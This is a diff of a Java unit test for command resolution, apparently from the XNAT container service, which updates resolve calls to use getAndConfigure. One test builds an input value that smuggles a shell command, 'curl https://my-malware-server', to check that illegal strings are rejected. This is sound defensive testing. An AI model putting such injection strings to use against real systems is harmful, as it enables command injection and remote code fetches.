@@ -275,7 +275,7 @@ public class CommandResolutionTest {
         final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
         assertThat(commandWrapper, is(not(nullValue())));
 
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
         assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                 runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
     }
@@ -313,7 +313,7 @@ public class CommandResolutionTest {
         final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
         assertThat(commandWrapper, is(not(nullValue())));
 
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
         assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                 runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
     }
@@ -343,7 +343,7 @@ public class CommandResolutionTest {
         final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
         assertThat(commandWrapper, is(not(nullValue())));
 
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
         assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                 runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
     }
@@ -374,7 +374,7 @@ public class CommandResolutionTest {
         final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
         assertThat(commandWrapper, is(not(nullValue())));
 
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
         assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                 runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
     }
@@ -404,7 +404,7 @@ public class CommandResolutionTest {
         final CommandWrapper commandWrapper = xnatCommandWrappers.get(commandWrapperName);
         assertThat(commandWrapper, is(not(nullValue())));
 
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
         assertStuffAboutResolvedCommand(resolvedCommand, dummyCommand, commandWrapper,
                 runtimeValues, expectedWrapperInputValues, expectedCommandInputValues);
     }
@@ -532,7 +532,7 @@ public class CommandResolutionTest {
         filledRuntimeValues.put("REQUIRED_WITH_FLAG", "foo");
         filledRuntimeValues.put("REQUIRED_NO_FLAG", "bar");
 
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(blankWrapper.id(), filledRuntimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(blankWrapper.id()), filledRuntimeValues, mockUser);
         assertThat(resolvedCommand.commandInputValues(),
                 containsInAnyOrder(
                         ResolvedCommand.ResolvedCommandInput.command("REQUIRED_WITH_FLAG", "foo"),
@@ -545,7 +545,7 @@ public class CommandResolutionTest {
 
         try {
             final Map<String, String> blankRuntimeValues = Maps.newHashMap();  // Empty map
-            commandResolutionService.resolve(blankWrapper.id(), blankRuntimeValues, mockUser);
+            commandResolutionService.resolve(commandService.getAndConfigure(blankWrapper.id()), blankRuntimeValues, mockUser);
             fail("Command resolution should have failed with missing required parameters.");
         } catch (CommandResolutionException e) {
             assertThat(e.getMessage(), is("Missing values for required inputs: REQUIRED_NO_FLAG, REQUIRED_WITH_FLAG."));
@@ -573,7 +573,7 @@ public class CommandResolutionTest {
             runtimeValues.put(inputName, "foo " + illegalString + " curl https://my-malware-server");
 
             try {
-                final ResolvedCommand resolvedCommand = commandResolutionService.resolve(identityWrapper.id(), runtimeValues, mockUser);
+                final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(identityWrapper.id()), runtimeValues, mockUser);
                 fail("Command resolution should have failed because of the illegal string.");
             } catch (IllegalInputException e) {
                 assertThat(e.getMessage(), is(String.format("Input \"%s\" has a value containing illegal string \"%s\".",
@@ -665,7 +665,7 @@ public class CommandResolutionTest {
         final String resourceInputJson = mapper.writeValueAsString(resourceInput);
 
         final Map<String, String> runtimeValues = Collections.singletonMap("resource", resourceInputJson);
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandWrapper.id(), runtimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(commandWrapper.id()), runtimeValues, mockUser);
 
         assertThat(resolvedCommand.mounts(), hasSize(1));
         final ResolvedCommandMount resolvedCommandMount = resolvedCommand.mounts().get(0);
@@ -727,7 +727,7 @@ public class CommandResolutionTest {
         final Map<String, String> runtimeValues = Maps.newHashMap();
         runtimeValues.put("resource", resourceRuntimeJson);
 
-        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(wrapper.id(), runtimeValues, mockUser);
+        final ResolvedCommand resolvedCommand = commandResolutionService.resolve(commandService.getAndConfigure(wrapper.id()), runtimeValues, mockUser);
 
         assertThat(resolvedCommand.mounts(), Matchers.<ResolvedCommandMount>hasSize(1));
 
